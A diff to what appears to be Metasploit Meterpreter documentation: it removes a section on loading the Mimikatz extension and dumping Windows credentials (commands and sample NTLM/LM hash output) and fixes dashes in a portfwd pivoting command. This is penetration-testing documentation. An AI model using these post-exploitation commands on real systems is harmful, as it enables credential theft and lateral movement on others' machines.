@@ -327,56 +327,6 @@ the specific post module you wish to run, and enter ```info -d``` to see the bas
 documentation.
 
 
-**Using the Mimikatz Extension**
-
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from memory on Windows. This might actually be the first thing you want to use as soon as you get a high-privileged session, such as SYSTEM.
-
-To begin, load the extension:
-
-```
-meterpreter > load mimikatz
-Loading extension mimikatz...success.
-meterpreter >
-```
-
-This will create more commands for the Meterpreter prompt. Most of them are meant to be used to
-retrieve user names, hashes, passwords and other information:
-
-```
-Mimikatz Commands
-=================
-
-    Command           Description
-    -------           -----------
-    kerberos          Attempt to retrieve kerberos creds
-    livessp           Attempt to retrieve livessp creds
-    mimikatz_command  Run a custom command
-    msv               Attempt to retrieve msv creds (hashes)
-    ssp               Attempt to retrieve ssp creds
-    tspkg             Attempt to retrieve tspkg creds
-    wdigest           Attempt to retrieve wdigest creds
-```
-
-An example of using the ```msv``` command:
-
-```
-meterpreter > msv
-[+] Running as SYSTEM
-[*] Retrieving msv credentials
-msv credentials
-===============
-
-AuthID    Package    Domain           User              Password
-------    -------    ------           ----              --------
-0;313876  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
-0;313828  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
-0;996     Negotiate  WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
-0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
-0;45518   NTLM                                          n.s. (Credentials KO)
-0;999     NTLM       WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
-```
-
-
 **Using the extapi Extension**
 
 The main purpose of the extapi extension is to perform advanced enumeration of the target machine. For
@@ -580,7 +530,7 @@ The route command in Meterpreter allows you change the routing table that is on 
 The portfwd command allows you to talk to a remote service like it's local. For example, if you are able to compromise a host via SMB, but are not able to connect to the remote desktop service, then you can do:
 
 ```
-meterpreter > portfwd add –l 3389 –p 3389 –r [Target Host]
+meterpreter > portfwd add -l 3389 -p 3389 -r [Target Host]
 ```
 
 And that should allow you to connect to remote desktop this way on the attacker's box:
